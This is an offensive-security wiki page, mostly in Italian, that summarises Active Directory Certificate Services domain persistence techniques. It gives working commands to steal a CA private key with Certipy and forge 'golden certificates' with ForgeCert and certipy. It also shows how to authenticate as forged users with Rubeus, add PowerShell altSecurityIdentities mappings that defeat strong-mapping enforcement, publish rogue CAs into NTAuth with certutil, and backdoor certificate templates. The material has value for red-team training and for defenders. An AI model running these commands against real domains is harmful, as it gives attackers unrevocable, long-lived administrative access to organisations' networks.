# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**This is a summary of the domain persistence techniques shared in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Check it for further details.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

Come si riconosce che un certificato è un certificato CA?

Si può determinare che un certificato è un certificato CA se sono soddisfatte diverse condizioni:

- Il certificato è archiviato sul server CA, con la sua chiave privata protetta dal DPAPI della macchina, o da hardware come un TPM/HSM se il sistema operativo lo supporta.
- I campi Issuer e Subject del certificato corrispondono al distinguished name della CA.
- Un'estensione "CA Version" è presente esclusivamente nei certificati CA.
- Il certificato non contiene campi Extended Key Usage (EKU).

Per estrarre la chiave privata di questo certificato, lo strumento `certsrv.msc` sul server CA è il metodo supportato tramite la GUI integrata. Tuttavia, questo certificato non differisce dagli altri archiviati nel sistema; pertanto, possono essere applicati metodi come la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) per l'estrazione.

Il certificato e la chiave privata possono anche essere ottenuti usando Certipy con il seguente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Dopo aver acquisito il certificato CA e la sua chiave privata in formato `.pfx`, strumenti come [ForgeCert](https://github.com/GhostPack/ForgeCert) possono essere utilizzati per generare certificati validi:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> L'utente preso di mira per la falsificazione del certificato deve essere attivo e in grado di autenticarsi in Active Directory affinché il processo abbia successo. Falsificare un certificato per account speciali come krbtgt è inefficace.

Questo certificato falsificato sarà **valido** fino alla data di fine specificata e finché il certificato root della CA sarà valido (solitamente da 5 a **10+ anni**). È inoltre valido per le **macchine**, quindi combinato con **S4U2Self**, un attaccante può **mantenere la persistenza su qualsiasi macchina del dominio** per tutto il tempo in cui il certificato della CA è valido.\
Inoltre, i **certificati generati** con questo metodo **non possono essere revocati** perché la CA non ne è a conoscenza.

### Operare con Strong Certificate Mapping Enforcement (2025+)

Dall'11 febbraio 2025 (dopo il rollout di KB5014754), i domain controller impostano per default **Full Enforcement** per le mappature dei certificati. In pratica questo significa che i certificati falsificati devono o:

- Contenere un vincolo forte all'account target (per esempio, l'estensione di sicurezza SID), oppure
- Essere abbinati a una mappatura esplicita e forte sull'attributo `altSecurityIdentities` dell'oggetto target.

Un approccio affidabile per la persistenza è emettere un certificato falsificato incatenato all'Enterprise CA rubata e poi aggiungere una mappatura esplicita e forte al principal della vittima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Note
- Se puoi creare certificati contraffatti che includono l'estensione di sicurezza SID, questi verranno mappati implicitamente anche con Full Enforcement. Altrimenti, preferisci mapping espliciti e robusti. Vedi [account-persistence](account-persistence.md) per maggiori dettagli sui mapping espliciti.
- La revoca non aiuta i difensori in questo caso: i certificati contraffatti sono sconosciuti al database CA e quindi non possono essere revocati.

## Fidarsi di certificati CA non autorizzati - DPERSIST2

L'oggetto `NTAuthCertificates` è definito per contenere uno o più **certificati CA** all'interno del suo attributo `cacertificate`, utilizzato da Active Directory (AD). Il processo di verifica da parte del **domain controller** prevede il controllo dell'oggetto `NTAuthCertificates` alla ricerca di una voce corrispondente alla **CA specificata** nel campo Issuer del **certificato** che autentica. L'autenticazione procede se viene trovata una corrispondenza.

Un certificato CA autofirmato può essere aggiunto all'oggetto `NTAuthCertificates` da un attaccante, a condizione che abbia il controllo su questo oggetto AD. Normalmente, solo i membri del gruppo **Enterprise Admin**, insieme ai **Domain Admins** o agli **Administrators** nel **dominio radice della foresta**, hanno il permesso di modificare questo oggetto. Possono modificare l'oggetto `NTAuthCertificates` usando `certutil.exe` con il comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, oppure impiegando il [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandi aggiuntivi utili per questa tecnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Questa capability è particolarmente rilevante se utilizzata in combinazione con un metodo descritto in precedenza che coinvolge ForgeCert per generare dinamicamente certificati.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Le opportunità per **persistence** tramite modifiche ai security descriptor dei componenti di **AD CS** sono numerose. Le modifiche descritte nella sezione "[Domain Escalation](domain-escalation.md)" possono essere implementate in modo malevolo da un attacker con accesso elevato. Questo include l'aggiunta di "control rights" (es., WriteOwner/WriteDACL/etc.) a componenti sensibili quali:

- L'oggetto **AD computer** del **CA server**
- Il **RPC/DCOM server** del **CA server**
- Qualsiasi **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (per esempio, il Certificate Templates container, il Certification Authorities container, l'oggetto NTAuthCertificates, ecc.)
- **AD groups delegated rights to control AD CS** per default o per l'organizzazione (come il gruppo built-in Cert Publishers e i suoi membri)

Un esempio di implementazione malevola comporterebbe un attacker con **elevated permissions** nel dominio che aggiunge il permesso **`WriteOwner`** al template di certificato di default **`User`**, con l'attacker come principal del diritto. Per sfruttare questo, l'attacker cambierebbe innanzitutto la proprietà del template **`User`** su se stesso. Successivamente, il **`mspki-certificate-name-flag`** verrebbe impostato a **1** sul template per abilitare **`ENROLLEE_SUPPLIES_SUBJECT`**, permettendo a un user di fornire un Subject Alternative Name nella richiesta. Di seguito, l'attacker potrebbe **enroll** usando il **template**, scegliendo un nome di **domain administrator** come alternative name, e utilizzare il certificato acquisito per l'autenticazione come DA.

Knobs pratici che gli attacker possono impostare per persistence a lungo termine (vedi {{#ref}}domain-escalation.md{{#endref}} per dettagli completi e rilevamento):

- CA policy flags che permettono SAN dai requester (es., abilitando `EDITF_ATTRIBUTESUBJECTALTNAME2`). Questo mantiene percorsi simili a ESC1 sfruttabili.
- DACL del template o impostazioni che permettono issuance con capacità di autenticazione (es., aggiungendo Client Authentication EKU, abilitando `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controllare l'oggetto `NTAuthCertificates` o i container CA per reinserire continuamente rogue issuers se i difensori tentano il cleanup.

> [!TIP]
> In ambienti rafforzati, dopo KB5014754, abbinare queste misconfigurazioni a mappature esplicite e forti (`altSecurityIdentities`) garantisce che i certificati emessi o forged rimangano utilizzabili anche quando i DCs applicano strong mapping.

## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
